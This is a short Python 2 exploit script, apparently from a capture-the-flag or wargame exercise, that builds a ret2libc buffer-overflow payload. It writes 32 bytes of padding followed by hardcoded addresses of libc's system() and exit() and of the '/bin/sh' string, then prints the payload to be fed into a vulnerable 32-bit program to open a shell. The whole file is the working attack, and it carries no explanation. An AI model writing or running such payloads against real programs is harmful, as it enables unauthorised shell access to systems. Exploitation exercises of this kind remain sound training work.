import struct
import sys

import struct


def p(x):
    return struct.pack('<L', x)

fexit  = 0xb7e57260
system = 0xb7e64310
binsh  = 0xb7f86d4c
# empty payload
payload = ""

#padding
payload += "A" * 32
payload += "\x10\x43\xe6\xb7"
payload += "\x60\x72\xe5\xb7"
payload += "\x4c\x6d\xf8\xb7"
 
print payload
